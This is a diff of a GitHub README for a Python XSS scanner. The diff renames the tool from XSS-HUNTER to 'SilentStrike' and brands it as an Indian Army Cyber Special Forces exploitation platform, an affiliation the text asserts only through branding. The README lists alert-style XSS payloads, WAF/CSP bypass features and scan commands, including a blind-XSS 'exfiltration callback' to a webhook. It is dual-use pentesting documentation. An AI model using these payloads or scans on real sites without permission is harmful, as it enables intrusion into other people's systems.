@@ -1,109 +1,128 @@
 <div align="center">
-  <img src="https://img.shields.io/badge/XSS-HUNTER%20v3.0-red?style=for-the-badge&logo=python" alt="XSS-HUNTER">
-  <img src="https://img.shields.io/badge/Reflected-Stored-blue?style=for-the-badge" alt="XSS Types">
-  <img src="https://img.shields.io/badge/DOM-Analysis-yellow?style=for-the-badge" alt="DOM">
-  <img src="https://img.shields.io/badge/Blind-Callback-orange?style=for-the-badge" alt="Blind">
+  <img src="https://img.shields.io/badge/SILENTSTRIKE-XSS%20v3.0-FF9933?style=for-the-badge&logo=python&labelColor=%23138808" alt="SilentStrike">
+  <img src="https://img.shields.io/badge/REFLECTED-STRIKE-FF9933?style=for-the-badge&labelColor=white" alt="Reflected">
+  <img src="https://img.shields.io/badge/STORED-PERSISTENCE-138808?style=for-the-badge&labelColor=white" alt="Stored">
+  <img src="https://img.shields.io/badge/DOM-SINK%20ANALYSIS-FF9933?style=for-the-badge&labelColor=%23138808" alt="DOM">
   <br>
-  <img src="https://img.shields.io/github/last-commit/aBadRoy/Python-based-Reflected-XSS-scanner?style=flat-square" alt="Last Commit">
-  <img src="https://img.shields.io/github/repo-size/aBadRoy/Python-based-Reflected-XSS-scanner?style=flat-square" alt="Repo Size">
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" alt="License">
-  <img src="https://img.shields.io/badge/Python-3.8%2B-blue?style=flat-square&logo=python" alt="Python">
+  <img src="https://img.shields.io/github/last-commit/aBadRoy/SilentStrike-XSS?style=flat-square&color=FF9933" alt="Last Commit">
+  <img src="https://img.shields.io/github/repo-size/aBadRoy/SilentStrike-XSS?style=flat-square&color=138808" alt="Repo Size">
+  <img src="https://img.shields.io/badge/License-MIT-FF9933?style=flat-square" alt="License">
+  <img src="https://img.shields.io/badge/Python-3.8%2B-138808?style=flat-square&logo=python" alt="Python">
 </div>
 
 ```ascii
-  ██╗  ██╗███████╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
-  ╚██╗██╔╝██╔════╝██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
-   ╚███╔╝ ███████╗███████╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
-   ██╔██╗ ╚════██║╚════██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
-  ██╔╝ ██╗███████║███████║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
-  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
+  ╔══════════════════════════════════════════════════════════════════════════════╗
+  ║                                                                              ║
+  ║   ███████ ██ ██      ███████ ███    ██ ████████ ███████ ██████  ██ ██   ██ ███████ ║
+  ║   ██      ██ ██      ██      ████   ██    ██    ██      ██   ██ ██ ██   ██ ██      ║
+  ║   ███████ ██ ██      █████   ██ ██  ██    ██    █████   ██████  ██ ███████ █████   ║
+  ║        ██ ██ ██      ██      ██  ██ ██    ██    ██      ██   ██ ██ ██   ██ ██      ║
+  ║   ███████ ██ ███████ ███████ ██   ████    ██    ███████ ██   ██ ██ ██   ██ ███████ ║
+  ║                                                                              ║
+  ╚══════════════════════════════════════════════════════════════════════════════╝
 ```
 
-<h1 align="center">XSS-HUNTER <sub>v3.0</sub></h1>
+<h1 align="center">
+  <span style="color:#FF9933">SILENT</span><span style="color:#FFFFFF">STRIKE</span> <sub style="color:#138808">v3.0</sub>
+</h1>
 
 <p align="center">
-  <strong>Advanced Cross-Site Scripting (XSS) Scanner — Reflected · Stored · DOM · Blind</strong>
+  <strong><span style="color:#FF9933">●</span> <span style="color:#FFFFFF">Indian Army · Cyber Special Forces</span> <span style="color:#138808">●</span></strong><br>
+  <em>Advanced XSS Detection & Neutralization Platform</em>
 </p>
 
 <p align="center">
-  <code>A Python-powered offensive security tool for detecting and validating XSS vulnerabilities across multiple contexts with 100+ payloads, automated crawling, and headless browser verification.</code>
+  <code>Reflected · Stored · DOM · Blind — 100+ payloads · 20+ contexts · 3-tier detection</code>
 </p>
+
+---
+
+## Mission Brief
+
+**SILENTSTRIKE** is a field-grade XSS (Cross-Site Scripting) reconnaissance and exploitation platform developed for the **Indian Army Cyber Special Forces**. Designed for offensive security operators, it combines automated web crawling, multi-vector payload delivery, and intelligent reflection analysis to identify and validate XSS vulnerabilities at scale.
+
+| Operator | aBadRoy |
+|----------|---------|
+| **Unit** | Indian Army · Cyber Special Forces |
+| **Platform** | Python 3.8+ |
+| **Classification** | UNCLASSIFIED // FOR AUTHORIZED USE ONLY |
 
 ---
 
 ## Table of Contents
 
-- [Features](#features)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Payload Coverage](#payload-coverage)
-- [Detection Methods](#detection-methods)
-- [Examples](#examples)
+- [Capabilities](#capabilities)
+- [Deployment](#deployment)
+- [Engagement Modes](#engagement-modes)
+- [Payload Arsenal](#payload-arsenal)
+- [Detection Grid](#detection-grid)
+- [Field Examples](#field-examples)
+- [After-Action Report](#after-action-report)
 - [Changelog](#changelog)
 - [Disclaimer](#disclaimer)
 - [Author](#author)
 
 ---
 
-## Features
+## Capabilities
 
-| Feature | Description |
-|---------|-------------|
+| Capability | Description |
+|------------|-------------|
 | **Reflected XSS** | 3 detection methods (direct, normalized, URL-decoded) across 100+ payloads |
 | **Stored XSS** | Two-pass verification — inject payload, then probe all pages for persistence |
 | **DOM-based XSS** | Static analysis of JavaScript for dangerous sinks (`document.write`, `innerHTML`, `eval`, `location`, etc.) |
 | **Blind XSS** | External callback support for out-of-band detection |
 | **Context-Aware** | 20+ injection contexts (HTML, attribute, script, URL, style, template, mutation, etc.) |
 | **Auto-Crawler** | Discovers URLs, forms, and parameters up to configurable depth |
-| **WAF Detection** | Identifies Web Application Firewalls blocking requests |
+| **WAF Detection** | Identifies Web Application Firewalls blocking engagement |
 | **Encoding Bypass** | Unicode, HTML entity, base64, mixed-case payload variants |
 | **Concurrent** | Multi-threaded scanning with configurable thread count |
 | **CSP Bypass** | Angular JS sandbox escape and meta refresh payloads |
-| **HTML Report** | Professional dark-theme report with vulnerability summary |
+| **HTML Report** | Professional dark-theme after-action report with vulnerability summary |
 | **Headless Ready** | Optional Playwright integration for browser-based execution verification |
 
 ---
 
-## Installation
+## Deployment
 
 ```bash
-# Clone
-git clone https://github.com/aBadRoy/Python-based-Reflected-XSS-scanner.git
-cd Python-based-Reflected-XSS-scanner
+# Clone the arsenal
+git clone https://github.com/aBadRoy/SilentStrike-XSS.git
+cd SilentStrike-XSS
 
-# Install dependencies
+# Arm dependencies
 pip install -r requirements.txt
 
-# Optional: headless browser support
+# Optional: headless browser support for execution verification
 pip install playwright
 playwright install chromium
 ```
 
 ---
 
-## Usage
+## Engagement Modes
 
 ```bash
 # Basic reflected XSS scan
 python scanner.py --url "http://target.com/search?q=test"
 
-# POST scan with cookies
+# POST scan with session cookie
 python scanner.py --url "http://target.com/login" \
   --method POST \
   --cookie "PHPSESSID=abc123; security=low"
 
-# Full scan: reflected + stored + DOM
+# Full sweep: reflected + stored + DOM
 python scanner.py --url "http://target.com" \
   --stored --dom \
   --depth 2 --threads 10
 
-# Blind XSS with external callback
+# Blind XSS with exfiltration callback
 python scanner.py --url "http://target.com/feedback" \
   --method POST \
   --blind "https://your-webhook.io/xss-callback"
 ```
 
-### Options
+### Operational Parameters
 
 | Argument | Description | Default |
 |----------|-------------|---------|
@@ -111,19 +130,19 @@ python scanner.py --url "http://target.com/feedback" \
 | `--method` | HTTP method (`GET`/`POST`) | `GET` |
 | `--cookie` | Session cookie string | `None` |
 | `--params` | Comma-separated parameters (auto-discovers if omitted) | auto |
-| `--threads` | Concurrent threads | `5` |
-| `--depth` | Crawl depth for endpoint discovery | `1` |
-| `--timeout` | Request timeout (seconds) | `15` |
-| `--stored` | Enable stored XSS detection | `False` |
-| `--dom` | Enable DOM-based XSS analysis | `False` |
+| `--threads` | Concurrent strike teams | `5` |
+| `--depth` | Recon penetration depth | `1` |
+| `--timeout` | Operation timeout (seconds) | `15` |
+| `--stored` | Enable stored XSS sweep | `False` |
+| `--dom` | Enable DOM XSS analysis | `False` |
 | `--blind` | Blind XSS callback URL | `None` |
 | `--headless` | Use Playwright for browser verification | `False` |
 
 ---
 
-## Payload Coverage
+## Payload Arsenal
 
-The scanner ships with **100+ payloads** across **20+ categories**:
+The platform ships with **100+ warheads** across **20+ categories**:
 
 ### HTML Context
 `<script>alert(1)</script>` · `<img src=x onerror=alert(1)>` · `<svg/onload=alert(1)>` · `<marquee onstart=alert(1)>` · `<details open ontoggle=alert(1)>` · `<body onload=alert(1)>` · `<input autofocus onfocus=alert(1)>` · `<video><source onerror=alert(1)>` · `<iframe srcdoc="<script>alert(1)</script>">`
@@ -145,7 +164,7 @@ Angular sandbox escape · Meta refresh · CDN-hosted library injection
 
 ---
 
-## Detection Methods
+## Detection Grid
 
 | Level | Method | Description |
 |-------|--------|-------------|
@@ -157,24 +176,24 @@ Angular sandbox escape · Meta refresh · CDN-hosted library injection
 
 ---
 
-## Examples
+## Field Examples
 
 ```bash
-# Test against Google's XSS Game (Level 1)
+# Google XSS Game — Level 1
 python scanner.py --url "https://xss-game.appspot.com/level1/frame?query=test"
 
-# Scan a form for stored XSS
+# Guestbook stored XSS sweep
 python scanner.py --url "http://localhost:8080/guestbook" \
   --method POST \
   --params "name,message" \
   --stored --depth 2
 
-# Full recon + scan on a target
+# Full recon + scan on test target
 python scanner.py --url "http://testphp.vulnweb.com/search.php" \
   --params "searchFor,category" \
   --dom --threads 8
 
-# Blind XSS with Burp Collaborator
+# Blind XSS with Burp Collaborator exfil
 python scanner.py --url "http://target.com/contact" \
   --method POST \
   --params "name,email,message" \
@@ -183,19 +202,32 @@ python scanner.py --url "http://target.com/contact" \
 
 ---
 
+## After-Action Report
+
+SilentStrike generates a professional **dark-theme HTML report** (`report.html`) after every engagement, featuring:
+
+- Tricolor header (saffron/white/green)
+- Vulnerability count and severity breakdown
+- Full engagement log with payload, reflection status, and execution verdict
+- Compromised assets table with payload previews
+- Military-styled After-Action formatting
+
+---
+
 ## Changelog
 
 ### v3.0 (Current)
-- Complete rewrite of scanning engine
+- Complete rewrite — codename **SILENTSTRIKE**
 - 100+ payloads across 20 injection contexts
 - Stored XSS (2-pass verification)
 - DOM-based XSS (JavaScript sink analysis)
 - Blind XSS with external callback support
 - Automatic crawling (URLs, forms, parameters)
 - WAF detection
-- 3 reflection detection methods
+- 3-tier reflection detection
 - Multi-threaded scanning
-- Professional HTML report with vulnerability summary
+- Professional HTML after-action report
+- Indian Army Cyber Special Forces branding
 
 ### v1.0 (Original)
 - Basic reflected XSS detection
@@ -208,7 +240,7 @@ python scanner.py --url "http://target.com/contact" \
 
 > **FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY.**
 >
-> This tool is designed to help security professionals identify XSS vulnerabilities in systems they **own** or have **explicit written permission** to test. Unauthorized use against systems without consent is illegal.
+> This tool is designed to help security operators identify XSS vulnerabilities in systems they **own** or have **explicit written permission** to test. Unauthorized use against systems without consent is illegal under the **Information Technology Act, 2000** (India) and similar cybercrime laws worldwide.
 >
 > The author assumes **zero liability** for misuse or damages caused by this software.
 
@@ -218,10 +250,15 @@ python scanner.py --url "http://target.com/contact" \
 
 **aBadRoy**
 - GitHub: [github.com/aBadRoy](https://github.com/aBadRoy)
-- Security researcher · Penetration tester · CTF enthusiast
+- Unit: Indian Army · Cyber Special Forces
+- Role: Security researcher · Penetration tester · CTF enthusiast
 
 ---
 
 <p align="center">
-  <sub><code># XSS-HUNTER v3.0 | Payloads: 100+ | Contexts: 20+ | Detection: 3 methods</code></sub>
+  <span style="color:#FF9933">●</span>
+  <span style="color:#FFFFFF">SILENTSTRIKE-XSS v3.0 | Payloads: 100+ | Contexts: 20+ | Detection: 3 methods</span>
+  <span style="color:#138808">●</span>
+  <br>
+  <sub><code>╔═╗╦═╗╦╔╗╔╔═╗╔╦╗╦╔═╗╔═╗╔╦╗  ╔═╗╔═╗╦ ╦╔═╗╦═╗╦╔═╗╦╔═╗╦═╗</code></sub>
 </p>
